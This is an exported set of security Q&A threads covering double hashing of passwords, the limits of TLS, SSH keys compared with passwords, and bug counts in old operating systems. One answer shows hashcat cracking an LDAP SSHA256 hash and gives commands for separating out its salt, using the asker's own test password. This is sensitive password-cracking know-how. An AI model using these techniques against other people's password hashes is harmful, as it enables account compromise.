"259408","259408","Is it safe to store a password using a secure hash followed by an insecure hash?","<p>I'm working with some middleware that requires username/password authentication. The middleware uses MD5 hash for the password. The MD5 hash, of course, is not fit for the purpose of storing passwords. We need to address this.</p>
<p>We tried modifying the middleware to use a newer hash but it is a crap system we can't really change easily. However, we can control the web site that sits on top of it, and it's easy to change its code. So one of our developers had this idea:</p>
<ol>
<li><p>When the user registers, the web site generates its own salt, then hashes the password with SHA-256 before passing it to the middleware. The middleware will then hash the password again using MD5 and its own salt.</p>
</li>
<li><p>When the user signs on, the web site retrieves its own salt then attempts to recreate the SHA-256 hash from the password that the user typed in. The web site then passes the SHA-256 hash to the middleware for validation. The middleware retrieves its own salt and attempts to recreate the MD5 hash from the salt and the SHA-256 that was passed in. If they match, the signon attempt is successful.</p>
</li>
</ol>
<p>By combining the hashes in this manner, will my site be as secure as if were using the SHA-256 hash alone? Or does double hashing create some kind of vulnerability?</p>
","27","6","259495","<p>There is indeed a problem, if the number of possible hash values of the less secure hash is low. Assume the hash $h_1(x)$ is extremely secure, but $h_2(x)$ has only say $2^{32}$ possible values.</p>
<p>If the correct password is p, and I try about $2^{32}$ random passwords q, then I can expect to find one where $h_2(h_1(q)) = h_2(h_1(p))$. That doesn't mean I found the correct password, just that I found one that I can enter instead of the correct password, and which will work.</p>
<p>It takes the same amount of guesses to find q such that $h_1(h_2(q)) = h_1(h_2(p))$. However, for this case I would just find q such that $h_2(q) = h_2(p)$, and then $h_1(h_2(q)) = h_1(h_2(p))$ is automatically true. So a super secure hash either before or after a hash with few possible values is not secure.</p>
<p>Now that is the case for brute force attacks. If one hash can be cracked not by brute force but by some clever mathematics, then the second, more secure hash may be in the way.</p>
<p>PS. I wrote in some comment &quot;If the middleware used ROT-13 for hashing, an attacker could recover the SHA-256 hash immediately&quot;. If we ignore the confusion about encryption vs. hashing, I can easily build a 256 bit hash roughly based on ROT-13, which would be awfully bad, but would have 2^256 possible outputs values so the argument above doesn't affect things badly. The worst hash which just splits the input into 256 bit groups and calculates an xor of those groups would be perfectly safe in this situation.</p>
","0"
"259383","259383","Are web servers that support HTTP any more vulnerable to client-run exploits than those that use HTTPS?","<p>Does HTTPS have any unique mechanisms that protect web servers from exploits run by a malicious client (eg. SQL injection, specific browser exploits etc.)?</p>
<p>My current understanding is that HTTPS is simply a HTTP session run over a TLS 1.2/1.3 tunnel (ideally), and wouldn't protect against any vulnerabilities of the client/server applications running on either end.</p>
<p>Is it correct that TLS only protects against MiTM and that browsers/web servers must be regularly patched to protect against all other exploits?</p>
","22","4","259385","<blockquote>
<p>Is it correct that TLS only protects against MiTM ... ?</p>
</blockquote>
<p>No, that is not correct. Here are also some other aspects:</p>
<ul>
<li>TLS provides confidentiality</li>
<li>TLS provides integrity</li>
<li>TLS provides protection against replay attacks</li>
<li>TLS provides forward secrecy</li>
</ul>
","2"
"259383","259383","Are web servers that support HTTP any more vulnerable to client-run exploits than those that use HTTPS?","<p>Does HTTPS have any unique mechanisms that protect web servers from exploits run by a malicious client (eg. SQL injection, specific browser exploits etc.)?</p>
<p>My current understanding is that HTTPS is simply a HTTP session run over a TLS 1.2/1.3 tunnel (ideally), and wouldn't protect against any vulnerabilities of the client/server applications running on either end.</p>
<p>Is it correct that TLS only protects against MiTM and that browsers/web servers must be regularly patched to protect against all other exploits?</p>
","22","4","259386","<p>You are correct; TLS provides no protection at all against malicious clients. You can think of TLS as providing a tunnel between the client and server. What's going through the tunnel is protected against attack <em>from outside the tunnel</em>, but it doesn't control what goes through the tunnel at all. Therefore, it doesn't protect against attacks launched <em>through</em> the tunnel (in either direction).</p>
","59"
"259383","259383","Are web servers that support HTTP any more vulnerable to client-run exploits than those that use HTTPS?","<p>Does HTTPS have any unique mechanisms that protect web servers from exploits run by a malicious client (eg. SQL injection, specific browser exploits etc.)?</p>
<p>My current understanding is that HTTPS is simply a HTTP session run over a TLS 1.2/1.3 tunnel (ideally), and wouldn't protect against any vulnerabilities of the client/server applications running on either end.</p>
<p>Is it correct that TLS only protects against MiTM and that browsers/web servers must be regularly patched to protect against all other exploits?</p>
","22","4","259388","<p>In the HTTPS extension, the communication protocol is encrypted using <em>Transport Layer Security</em> (TLS) that provides security for the <em>transport layer</em>. The web server, web application and web browser vulnerabilities are all <em>application layer</em> problems. Therefore, web browsers, web servers and web application all require regular security updates despite the utilization of HTTPS.</p>
<p>A <em>web application firewall</em> (WAF) on the server may help filtering malicious content transmitted over HTTPS. That might help protecting your web application from attacks against 0-day vulnerabilities. However, the request must look malicious in general (particularly most SQL injections and XSS vulnerabilities are easy to detect).</p>
<p>Additionally, TLS and its predecessor <em>Secure Sockets Layer</em> (SSL) have had vulnerabilities, too. Some have been weaknesses in the protocol itself (weak cipher suites, POODLE, BEAST, CRIME &amp; BREACH) and some on the implementation (e.g. Heartbleed <a href=""https://nvd.nist.gov/vuln/detail/CVE-2014-0160"" rel=""noreferrer"">CVE-2014-0160</a>). For this reason, you have to keep your TLS implementation up-to-date, too, and disable <a href=""https://endoflife.software/protocols/encryption/tls"" rel=""noreferrer"">outdated versions of the protocol</a>.</p>
","10"
"259383","259383","Are web servers that support HTTP any more vulnerable to client-run exploits than those that use HTTPS?","<p>Does HTTPS have any unique mechanisms that protect web servers from exploits run by a malicious client (eg. SQL injection, specific browser exploits etc.)?</p>
<p>My current understanding is that HTTPS is simply a HTTP session run over a TLS 1.2/1.3 tunnel (ideally), and wouldn't protect against any vulnerabilities of the client/server applications running on either end.</p>
<p>Is it correct that TLS only protects against MiTM and that browsers/web servers must be regularly patched to protect against all other exploits?</p>
","22","4","259393","<p>Using HTTPS, the server is usually MORE vulnerable.</p>
<p>You still have the whole HTTP stack with its potential vulnerabilities exposed AND you now have all the TLS stack vulnerabilities for the attacker to pick from.</p>
<p>TLS vulnerabilities can be impressively bad - see e.g. the OpenSSL Hearthbleed.</p>
<hr />
<p>On the other hand, HTTPS in some sense reduces the probability of the attack success by making it harder to obtain valid user credentials and/or to inject malicious code into the HTTP interaction.</p>
<p>(A lot of attacks are of &quot;privilege escalation&quot; type and require authentication, even if the authenticated user nominally has low privileges in the system.)</p>
<p>This is especially effective if the HTTPS server uses TLS authentication with client certificates. In this case, an attacker without a valid client certificate can only poke the TLS frontend. They will have to break the TLS code or obtain a valid cert + its private key by other means in order to get to the HTTP stack in the first place.</p>
<p>A well-maintained policy of issuing client certs only on hardware tokens may force the potential attacker well into the social engineering domain even if the system has gross HTTP or higher level vulnerabilities.</p>
","-2"
"259359","259359","If I only connect through encrypted protocols like TLS, is there still a risk over an insecure wifi?","<p>Assuming the attacker can read all the traffic (he cracked my WPA2 for example), is there still something he can do if i'm only connecting through TLS and similar protocols ?</p>
","1","3","259360","<p>Generally, TLS is secure against active and passive adversaries. However, some details need to be considered:</p>
<ul>
<li>TLS version</li>
<li>Your system time</li>
<li>Your DNS</li>
<li>Your system's (or browser) CA certificates</li>
</ul>
","0"
"259359","259359","If I only connect through encrypted protocols like TLS, is there still a risk over an insecure wifi?","<p>Assuming the attacker can read all the traffic (he cracked my WPA2 for example), is there still something he can do if i'm only connecting through TLS and similar protocols ?</p>
","1","3","259364","<p>There is <em>always</em> something an attacker can do. Absolute security does not exist. Regarding your specific question, and leaving aside the vague notion &quot;similar protocols&quot;, there are various types of attacks against TLS secured connections. Their chances of success depend on many other circumstances besides an attacker's access to your WiFi network, such as:</p>
<ul>
<li>software vulnerabilities on your client system</li>
<li>vulnerabilities of other systems in your network, most importantly your router</li>
<li>your security awareness and attention</li>
<li>diligence of those who operate the systems you are connecting to</li>
</ul>
<p>Just one example to illustrate: If you receive an email saying &quot;This is an important message from Your Bank. For security reasons please download and install our newest security program immediately by clicking on this link.&quot; and you unthinkingly follow those instructions then neither WPA3 nor TLS will save you.</p>
","0"
"259359","259359","If I only connect through encrypted protocols like TLS, is there still a risk over an insecure wifi?","<p>Assuming the attacker can read all the traffic (he cracked my WPA2 for example), is there still something he can do if i'm only connecting through TLS and similar protocols ?</p>
","1","3","259366","<p>TLS guarantees three properties of the data exchanged inside the connection: confidentiality, authenticity and integrity. This is all under the assumption that the endpoints and the public-key infrastructure are secure: here we're only concerned about attacks on the network (eavesdropper, man-in-the-middle).</p>
<ul>
<li>Confidentiality means that an adversary can't learn what data is exchanged over the connection, only its size and the time at which it is exchanged.</li>
<li>Authenticity means that you can be sure that your machine is connecting to the expected server.</li>
<li>Integrity means that an adversary can't alter or modify the data exchanged over the connection. (Not even just to replay an old, unmodified connection.)</li>
</ul>
<p>The main limitation is that an adversary can change and modify data that isn't exchanged over TLS. This includes non-TLS links that you might accidentally follow. This also includes server names: DNS is mostly not encrypted. An adversary can't trick you into connecting to the wrong server by modifying DNS traffic (if it tries, TLS's protection will prevent your browser from connecting to the wrong server), but they can learn which server you're connecting to. (Just the server name, not the full URL.)</p>
<p>These days, most of the web uses HTTPS, so the main advantage of a secure wifi is that DNS gets encrypted. Note that <em>secure</em> wifi doesn't just mean <em>encrypted</em> wifi: encrypted wifi provided by someone you don't trust is no better than non-encrypted wifi.</p>
","2"
"259339","259339","Difference between SSH-keys and password-based authentication","<p>I read an article about SSH-keys. The author says that they are stronger than password-based authentication. All you need to do is just to create a pair of keys (public key and private key), move your public key to the server and you are done. I know that assymetric key cryptography come in handy when encoding data, but what data do you encode in this case? So, why exactly SSH-keys are stronger than password-based authentication? For me private key is just a long password. The difference is only in the ways to enter the remote host. In password-based authentication you just type the password, in SSH-keys authentication you just type in the private key:</p>
<p><code>$ ssh -i privatekey.private user@the_server_address</code></p>
<p>So what's the difference?</p>
","9","5","259340","<p>You are missing a lot. I think there are two main points:</p>
<ol>
<li><p>User-chosen passwords are low entropy. When people choose a password, they sometimes use really poor passwords (you can guess the password given 10 tries), and when forced to choose better passwords they usually only get up to about 20 bits of security. The standard today is 128 bits, so you need to select 12 words at random from a list of 2048 words using dice. That is a strong password. Nobody does this manually. A computer generated token of length 20 which uses upper case and lower case letters and digits would be a good password. Thus, many systems don't let users choose passwords and instead have the computer generate a token and let the user copy it. For example, AWS IAM secret access keys work this way.</p>
</li>
<li><p>To authenticate a password the server needs to store a &quot;recognizer&quot; for the password. It can be the password itself but that is obviously very bad (an attacker can steal your password from the server's storage, even if you don't use the password while the attacker has access). To avoid this, for user-generated low-entropy passwords the server has to use a computationally expensive password storage system like argon2id. For a computer generated high entropy token the server can store the hash or HMAC of the token, which is computationally cheap and fast and secure. But, the server still needs your password/token during the login process to verify that you know the password/token. During this time when you're performing login, the server knows your password and an attacker in control of the server can steal it. With asymmetric cryptography, the &quot;password&quot; (your long term private key) doesn't leave your device. The server sends a new challenge and you compute a solution to the challenge on your device using your private key and send the result and the server has a &quot;recognizer&quot; stored (the public key) that lets it determine whether you have computed something that could only have been computed with access to the private key (a private key that the server has never seen). Someone seeing your challenge-response pairs cannot compute the response to the next challenge. This means that an attacker in full control of the server doesn't get to steal your private key. They might be able to fool you to sign / authorize bad things, but not steal your key, and when the attacker's access is revoked you don't need to roll your key.</p>
</li>
</ol>
<p>One of the problems people have when trying to learn about asymmetric cryptography, which you appear to have not even tried to do but I hope you will now try, is that people's intuition about asymmetric cryptography is that the thing it promises to do (and actually does) is impossible. That a Diffie Hellman key exchange or a digital signature or a KEM are impossible, there must be some trick and there must be some way to just compute the private key from the public key or something. But no, asymmetric cryptography really does what it says, and you can't simulate that with symmetric cryptography.</p>
","19"
"259339","259339","Difference between SSH-keys and password-based authentication","<p>I read an article about SSH-keys. The author says that they are stronger than password-based authentication. All you need to do is just to create a pair of keys (public key and private key), move your public key to the server and you are done. I know that assymetric key cryptography come in handy when encoding data, but what data do you encode in this case? So, why exactly SSH-keys are stronger than password-based authentication? For me private key is just a long password. The difference is only in the ways to enter the remote host. In password-based authentication you just type the password, in SSH-keys authentication you just type in the private key:</p>
<p><code>$ ssh -i privatekey.private user@the_server_address</code></p>
<p>So what's the difference?</p>
","9","5","259341","<blockquote>
<p>I know that assymetric key cryptography come in handy when encoding data, but what data do you encode in this case?</p>
</blockquote>
<p>Basically, you encode some challenge/response data to prove to the server that you hold the private key (the secret key) that corresponds to the public key on the server. You never send the private key to the server.</p>
<blockquote>
<p>So, why exactly SSH-keys are stronger than password-based authentication? For me private key is just a long password.</p>
</blockquote>
<p>Yes, this is one reason why SSH-keys are stronger. They are effectively longer (and thus stronger) than typical passwords.</p>
<p>Another reason is that you do not have to transmit the secret material (the private key) to the server. You only have to prove that you possess the private key, as discussed above.</p>
<blockquote>
<p>In password-based authentication you just type the password, in SSH-keys authentication you just type the private key:
$ ssh -i privatekey.private user@the_server_address</p>
</blockquote>
<p>No, you don't &quot;type in the private key.&quot; You provide ssh the location of the private key file. Then ssh uses that private key in a challenge/response protocol to prove to the server that you hold the key, but the key never leaves your computer. This is different than the password, which you actually <em>do</em> type in and actually does get transmitted to the server.</p>
<blockquote>
<p>So what's the difference?</p>
</blockquote>
<p>See all the differences I explained above.</p>
","12"
"259339","259339","Difference between SSH-keys and password-based authentication","<p>I read an article about SSH-keys. The author says that they are stronger than password-based authentication. All you need to do is just to create a pair of keys (public key and private key), move your public key to the server and you are done. I know that assymetric key cryptography come in handy when encoding data, but what data do you encode in this case? So, why exactly SSH-keys are stronger than password-based authentication? For me private key is just a long password. The difference is only in the ways to enter the remote host. In password-based authentication you just type the password, in SSH-keys authentication you just type in the private key:</p>
<p><code>$ ssh -i privatekey.private user@the_server_address</code></p>
<p>So what's the difference?</p>
","9","5","259343","<p>Modern keys are always stronger than passwords. They're also much harder to steal.</p>
<p>This is kind of like comparing an RFID-chip key for your car to a PIN code. They're both better than nothing, but somebody can guess your PIN (four digits means there are 10k iterations, which provides 13 <a href=""https://en.wikipedia.org/wiki/Bits_of_security"" rel=""nofollow noreferrer"">bits of security</a>) and nobody can reasonably guess both your key's tooth configuration (seven teeth with four levels is 16 thousand iterations) and the RFID code embedded inside it (32-bit encryption is 4 billion iterations, though since you need both, multiply them: 4⁷ × 2³² = 70 trillion, 46-bit security).</p>
<p>A password consisting of 16 random printable characters has 94¹⁶ = 104 bits of security (37 nonillion = 3.7e31 iterations), though this assumes the password is truly random and <a href=""https://twitter.com/adamhotep/status/1234631623322324993"" rel=""nofollow noreferrer"">that's unlikely</a>.
The current standard for SSH is <a href=""https://en.wikipedia.org/wiki/EdDSA#Ed25519"" rel=""nofollow noreferrer"">ED25519</a>, which has 128 bits of security (340 undecillion iterations, about ten million times stronger).</p>
<p>You can think of keys as really long passwords, but they're actually a lot more potent than that. Passwords are hashed, meaning their entropy is limited by the entropy of the hashing function, while a key would use its higher entropy.</p>
<p>Additionally, you can be more certain the key fully represents its assigned entropy (whereas most passwords are designed to be memorable at the expense of their entropy). Passwords can be collected by phishing campaigns or man-in-the-middle attacks while keys are never actually transmitted anywhere.</p>
","2"
"259339","259339","Difference between SSH-keys and password-based authentication","<p>I read an article about SSH-keys. The author says that they are stronger than password-based authentication. All you need to do is just to create a pair of keys (public key and private key), move your public key to the server and you are done. I know that assymetric key cryptography come in handy when encoding data, but what data do you encode in this case? So, why exactly SSH-keys are stronger than password-based authentication? For me private key is just a long password. The difference is only in the ways to enter the remote host. In password-based authentication you just type the password, in SSH-keys authentication you just type in the private key:</p>
<p><code>$ ssh -i privatekey.private user@the_server_address</code></p>
<p>So what's the difference?</p>
","9","5","259355","<p>Ssh keys are stronger that passwords for 2 distinct reasons:</p>
<ol>
<li><p>There is no &quot;shared secret&quot; so the private key is never known by the server. The server sends a challenge (a random value), the client encodes it with the private key, and the server validates it with the public key. On the other hand, even if only a hash of the password is stored, the server does receive the plain text password and if it has been compromissed, it can steal the password</p>
</li>
<li><p>They have much higher entropy than the average password. They are always generated by crypto software so we can expect them to be as close to random as possible. On the other hand passwords that human can remember generally have a much more limited entropy and can be subject to <em>social attacks</em> (name of children of just the initials, name of a pet, etc.)</p>
</li>
</ol>
","5"
"259339","259339","Difference between SSH-keys and password-based authentication","<p>I read an article about SSH-keys. The author says that they are stronger than password-based authentication. All you need to do is just to create a pair of keys (public key and private key), move your public key to the server and you are done. I know that assymetric key cryptography come in handy when encoding data, but what data do you encode in this case? So, why exactly SSH-keys are stronger than password-based authentication? For me private key is just a long password. The difference is only in the ways to enter the remote host. In password-based authentication you just type the password, in SSH-keys authentication you just type in the private key:</p>
<p><code>$ ssh -i privatekey.private user@the_server_address</code></p>
<p>So what's the difference?</p>
","9","5","259367","<p>In addition to the above answers, some other cool things with SSH keys:</p>
<ol>
<li>I can generate the keypair, drop the public key on Github or Gitlab, and have a script to download them automatically for me on my staging servers. This key will work in all those places. When it is also setup to ONLY allow the publicly-accessible keys, that means I can revoke the keys whenever I need by removing them from my account.</li>
<li>If I assign a passphrase to an SSH private key (miniscule but another step), I can change that passphrase as often as I want without having to replace the public key on my target servers.</li>
<li>The randomly-generated key pair is not tied to something you know, like a password would be (i.e. <code>hunter2</code> probably has a dog named Hunter). The seemingly-randomness is not personally identifiable as you, other than the comment at the end (which can be changed anyways).</li>
<li>If you're using certificate-based SSH key authentication, things get even cooler (so I'm told - I haven't used them yet).</li>
</ol>
","0"
"259293","259293","How can I extract salt from encoded base64 Salted SHA 256 hashed password","<p>I have a SSHA256 hashed password. Below is the plaintext and hashed password for it.</p>
<pre><code>PlainText -p@ssw0rd
Encrypted -{SSHA256}LGkJJV6e7wPDKEr3BKSg0K0XDllewz9tvSNSaslDmIfPFmyuI5blUK/QsTXjvgFKLlMQm1jPC7K7z/KaD4zoHQ==
</code></pre>
<p>How can I extract salt from this password. The salt is 32 bytes long. And using SHA-256 algorithm to generate hash. This hash password is authenticated by IAM like okta also. Is there a way I can extract salt for this.</p>
","2","3","259294","<p>I don't think there really is extraction with hashes, only collisions considering the it's function. For example Md5 and SHA1.</p>
<p>Since you know the password, and you know 32 bytes of string is the salt, you approach would be brute force. But this is where SHA256 fails, it's a really fast hashing algorithm and one of the reasons why argon2id is suggested which is resistant to multiple CPU and GPU bound speeds.</p>
<p>If you know what encoding scheme was used, it will help narrow down your list to check with. There are some great stackoverflow answers on how to calculate the list.</p>
<p>For example, if you have a Nvidia GTX 3090, you can expect around 121 MH/s hash rate, thats 121 million per second, approximately. For a 95 ASCII characters set, and for 8 character password, it'll be 95^8 possibilities. So with this example, it'll be a list of 6.6342043128906 x 10^15. So it's not peanuts, but it depends on how motivated you are.</p>
","1"
"259293","259293","How can I extract salt from encoded base64 Salted SHA 256 hashed password","<p>I have a SSHA256 hashed password. Below is the plaintext and hashed password for it.</p>
<pre><code>PlainText -p@ssw0rd
Encrypted -{SSHA256}LGkJJV6e7wPDKEr3BKSg0K0XDllewz9tvSNSaslDmIfPFmyuI5blUK/QsTXjvgFKLlMQm1jPC7K7z/KaD4zoHQ==
</code></pre>
<p>How can I extract salt from this password. The salt is 32 bytes long. And using SHA-256 algorithm to generate hash. This hash password is authenticated by IAM like okta also. Is there a way I can extract salt for this.</p>
","2","3","259295","<p>The &quot;encrypted&quot; (hashing is not encryption) text given is 64 bytes long (after base64 decode). This is exactly the length of a 32-byte salt plus a SHA-256 digest (also 32 bytes). Therefore, it's very likely that the base64-decoded data contains the salt in one half, and the digest in the other. Which is which can be determined experimentally, though unless you know the construction used for salting before hashing, it might take more than two tries.</p>
<p>For convenience, the hex values of the first and second half of your &quot;encrypted&quot; text are:
<code>2c6909255e9eef03c3284af704a4a0d0ad170e595ec33f6dbd23526ac9439887</code>
<code>cf166cae2396e550afd0b135e3be014a2e53109b58cf0bb2bbcff29a0f8ce81d</code></p>
<p>Figuring out what construction - method of combining password and salt, plus method of hashing them - was used is up to you. It doesn't look to be any of the really obvious &quot;H(salt | password)&quot; or &quot;H(password | salt)&quot; options. Are you sure it's not an HMAC, KDF, or actual encryption?</p>
","2"
"259293","259293","How can I extract salt from encoded base64 Salted SHA 256 hashed password","<p>I have a SSHA256 hashed password. Below is the plaintext and hashed password for it.</p>
<pre><code>PlainText -p@ssw0rd
Encrypted -{SSHA256}LGkJJV6e7wPDKEr3BKSg0K0XDllewz9tvSNSaslDmIfPFmyuI5blUK/QsTXjvgFKLlMQm1jPC7K7z/KaD4zoHQ==
</code></pre>
<p>How can I extract salt from this password. The salt is 32 bytes long. And using SHA-256 algorithm to generate hash. This hash password is authenticated by IAM like okta also. Is there a way I can extract salt for this.</p>
","2","3","259296","<p>This is LDAP SSHA256, known to hashcat as mode 1411, and cracks successfully as such:</p>
<pre><code>$ cat ssha256.hash
{SSHA256}LGkJJV6e7wPDKEr3BKSg0K0XDllewz9tvSNSaslDmIfPFmyuI5blUK/QsTXjvgFKLlMQm1jPC7K7z/KaD4zoHQ==

$ cat ssha256.list 
p@ssw0rd

$ hashcat ssha256.hash ssha256.list

[...]

{SSHA256}LGkJJV6e7wPDKEr3BKSg0K0XDllewz9tvSNSaslDmIfPFmyuI5blUK/QsTXjvgFKLlMQm1jPC7K7z/KaD4zoHQ==:p@ssw0rd
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1411 (SSHA-256(Base64), LDAP {SSHA256})
Hash.Target......: {SSHA256}LGkJJV6e7wPDKEr3BKSg0K0XDllewz9tvSNSaslDmI...zoHQ==
</code></pre>
<p>From looking at <a href=""https://github.com/hashcat/hashcat/issues/928"" rel=""nofollow noreferrer"">the hashcat feature request</a> and <a href=""https://github.com/hashcat/hashcat/blob/master/src/modules/module_01411.c"" rel=""nofollow noreferrer"">the associated code</a>, it looks like the first 32 bytes are the hash, and all remaining bytes are the salt. So in your case, this happens to be exactly half and half - but strictly speaking, a compliant implementation that can handle arbitrary salt lengths would grab the first 32 bytes as the hash, and then grab <em>all remaining bytes</em> as the salt.</p>
<p>Depending on what form you need to work with it, it's decoded just as CBHacking describes - &quot;un-<code>base64</code>&quot; it first, then separate the results out into the two sections. You can then take the password (well, the hex, to illustrate appending):</p>
<pre><code>$ echo -n p@ssw0rd | xxd -p
7040737377307264
</code></pre>
<p>... and then append the salt, and <code>sha256</code> <em>the binary form</em> of the result (converted from hex back to binary here with <code>xxd -p -r</code>), yielding your hash:</p>
<pre><code>$ echo -n 7040737377307264cf166cae2396e550afd0b135e3be014a2e53109b58cf0bb2bbcff29a0f8ce81d | xxd -p -r | sha256sum
2c6909255e9eef03c3284af704a4a0d0ad170e595ec33f6dbd23526ac9439887
</code></pre>
<p>... which, when your salt is appended, converted back to binary, and then <code>base64</code>'d, produces your original string:</p>
<pre><code>$ echo -n 2c6909255e9eef03c3284af704a4a0d0ad170e595ec33f6dbd23526ac9439887cf166cae2396e550afd0b135e3be014a2e53109b58cf0bb2bbcff29a0f8ce81d | xxd -p -r | base64
LGkJJV6e7wPDKEr3BKSg0K0XDllewz9tvSNSaslDmIfPFmyuI5blUK/QsTXjvgFKLlMQm1jPC7K7z/KaD4zoHQ==
</code></pre>
","5"
"259255","259255","What is the frequency of open security bugs in an operating system with increasing age?","<p>I am having a discussion with friends and my point is that the older a feature-frozen operating system is, the fewer security bugs are left unpatched and therefore the cost for the company to fix them decreases with age.</p>
<p><strong>My assumption is: there are a finite number of bugs in a code which is not changed except for fixing bugs. The more get fixed, the fewer there are.</strong></p>
<p>With &quot;feature frozen&quot; I mean an operating system which receives no more feature updates, but only security updates. For example Windows 7, from when feature updates ended 7 years ago until when security updates ended 2 years ago, or Windows 8.1 now, since feature updates ended 4 years ago and security updates will continue for another 11 months. I based these examples on <a href=""https://endoflife.date/windows"" rel=""noreferrer"">https://endoflife.date/windows</a></p>
<p>This does not mean that fixing one bug won't introduce another one, but that in general, fewer bugs are introduced with bugfixes than are fixed.</p>
<p>Is my assumption correct? Is the frequency of (still open) vulnerabilities decreasing with age of a software, in particular of an operating system, from the moment it is feature-frozen until the end of security support?</p>
<p>I found for example the website <a href=""https://www.cvedetails.com/vulnerability-list/vendor_id-26/product_id-17153/Microsoft-Windows-7.html"" rel=""noreferrer"">CVEdetails on Windows 7</a> but I cannot manage to restrict the search to unpatched bugs. I think it lists the frequency of new security bugs.</p>
<hr />
<p><em>Not part of the question</em>, but to explain why I got thinking about what I asked above:</p>
<p>Software companies provide a software, and in my opinion they should fix any vulnerability which gets discovered as long as customers are allowed to run the system, or they should kill it, like Sonos did with their unsupported speakers (for an operating system, it would not kill the machine but refuse to run past its extended support expiration date). Therefore I was wondering whether the older the system, the fewer vulnerabilities are discovered, and the lower the costs incurred in this endless security support. Of course not supporting it is cheaper, but that's not &quot;right&quot; according to my point of view.</p>
","18","4","259257","<p>Interesting theory but...</p>
<p>Even in open-source code, serious bugs can go unnoticed for a very long time (think <a href=""https://en.wikipedia.org/wiki/Log4j#Log4Shell_vulnerability"" rel=""noreferrer"">Log4j</a>), because nobody had the time or inclination to analyze the code. Probably, a three-letter agency or a 0-day merchant knew but did not disclose what they knew, so the public at large was left in the dark and vulnerable.</p>
<p>It's true that old, proven software tends to become more reliable over time, it can have fewer bugs, but the bugs can still be very serious. <strong>The problem is not the number of bugs, but their severity.</strong></p>
<p>Operating systems contain <strong>third-party code</strong> too, so they are routinely shipped with flawed <strong>dependencies</strong>, that are time bombs waiting to explode. Another recent example is the <a href=""https://www.scmagazine.com/news/cloud-security/local-privilege-escalation-vulnerability-found-on-polkit-program-found-on-every-linux-variant"" rel=""noreferrer"">polkit</a> vulnerability affecting Linux systems. Not to mention closed-source binaries such as drivers or firmware blobs. Note that the polkit vulnerability is a privilege escalation, you have to be a local user to exploit it, so it is less serious than the Log4j vulnerability (which can be triggered remotely by an unauthenticated user).</p>
<p>But a &quot;feature-frozen&quot; OS is dead by definition. To stay relevant an OS must keep adding features, just to keep up with new hardware. Over time the <strong>number of lines of code</strong> tends to increase, not decrease. For a modern OS, it is expressed in millions of lines of code. For instance:</p>
<blockquote>
<p>The Linux kernel has around 27.8 million lines of code in its Git
repository, up from 26.1 million a year ago, while systemd now has
nearly 1.3 million lines of code, according to GitHub stats analysed
by Michael Larabel at Phoronix.</p>
</blockquote>
<p>Source: <a href=""https://www.linux.com/news/linux-in-2020-27-8-million-lines-of-code-in-the-kernel-1-3-million-in-systemd/"" rel=""noreferrer"">Linux in 2020: 27.8 million lines of code in the kernel, 1.3 million in systemd</a></p>
<p>And complexity is the enemy of security. Generally speaking, the more complexity, the more there is potential for bugs. Software in general never gets &quot;simplified&quot;, <strong>bloat</strong> is more like the norm. While it is possible that there are fewer bugs over time, I find that counter-intuitive.</p>
<p>Speaking of dead operating systems: OS/2 is still used at some places, even for crucial industrial processes. Example: <a href=""https://hackaday.com/2019/06/20/the-os-2-operating-system-didnt-die-it-went-underground/"" rel=""noreferrer"">The OS/2 Operating System Didn’t Die… It Went Underground.</a>.
But the environments tend to be quite specific and isolated.</p>
<p>I find it difficult to answer the question, you could look at CVE statistics but they only list the <strong>reported</strong> vulnerabilities. And many vulnerabilities are reported outside of &quot;official&quot; channels, sometimes disclosure takes place through Github, a tweet, or a post on a mail list.</p>
<p>But what matters is the severity, not the quantity.</p>
<p>The bottom line is that even sane code can be vulnerable because it depends on a larger <strong>ecosystem</strong> of dependencies. For example, many applications are still shipping with vulnerable and outdated DLLs. The problem is the packaging and the lack of upstream quality control. Very common problem in this industry.</p>
<p>I would make the case that the bugs that get fixed are the bugs that are <strong>visible</strong>, that is functional bugs that the users experience and can reproduce. They are easier to identify and report.
The more serious bugs, the security vulnerabilities are not the most visible.</p>
","30"
"259255","259255","What is the frequency of open security bugs in an operating system with increasing age?","<p>I am having a discussion with friends and my point is that the older a feature-frozen operating system is, the fewer security bugs are left unpatched and therefore the cost for the company to fix them decreases with age.</p>
<p><strong>My assumption is: there are a finite number of bugs in a code which is not changed except for fixing bugs. The more get fixed, the fewer there are.</strong></p>
<p>With &quot;feature frozen&quot; I mean an operating system which receives no more feature updates, but only security updates. For example Windows 7, from when feature updates ended 7 years ago until when security updates ended 2 years ago, or Windows 8.1 now, since feature updates ended 4 years ago and security updates will continue for another 11 months. I based these examples on <a href=""https://endoflife.date/windows"" rel=""noreferrer"">https://endoflife.date/windows</a></p>
<p>This does not mean that fixing one bug won't introduce another one, but that in general, fewer bugs are introduced with bugfixes than are fixed.</p>
<p>Is my assumption correct? Is the frequency of (still open) vulnerabilities decreasing with age of a software, in particular of an operating system, from the moment it is feature-frozen until the end of security support?</p>
<p>I found for example the website <a href=""https://www.cvedetails.com/vulnerability-list/vendor_id-26/product_id-17153/Microsoft-Windows-7.html"" rel=""noreferrer"">CVEdetails on Windows 7</a> but I cannot manage to restrict the search to unpatched bugs. I think it lists the frequency of new security bugs.</p>
<hr />
<p><em>Not part of the question</em>, but to explain why I got thinking about what I asked above:</p>
<p>Software companies provide a software, and in my opinion they should fix any vulnerability which gets discovered as long as customers are allowed to run the system, or they should kill it, like Sonos did with their unsupported speakers (for an operating system, it would not kill the machine but refuse to run past its extended support expiration date). Therefore I was wondering whether the older the system, the fewer vulnerabilities are discovered, and the lower the costs incurred in this endless security support. Of course not supporting it is cheaper, but that's not &quot;right&quot; according to my point of view.</p>
","18","4","259267","<p>Apart from all the points raised by others, another thing to consider is the fact that a feature frozen will not receive newly implemented security features either. While security features don't patch bugs themselves, they make exploiting the bugs either more difficult, or in some cases, impossible. Which means that while older OSes <em>may</em> have less bugs, more of those bugs may be exploitable.</p>
<p>For example, Windows Defender Exploit Guard, which is an important set of mitigations for security vulnerabilities, is only available on Windows 10 (older versions can use EMET, but that reached end of support in 2018). Kernel Data Protection is another virtualization-based security feature that was added in Windows 10.</p>
","13"
"259255","259255","What is the frequency of open security bugs in an operating system with increasing age?","<p>I am having a discussion with friends and my point is that the older a feature-frozen operating system is, the fewer security bugs are left unpatched and therefore the cost for the company to fix them decreases with age.</p>
<p><strong>My assumption is: there are a finite number of bugs in a code which is not changed except for fixing bugs. The more get fixed, the fewer there are.</strong></p>
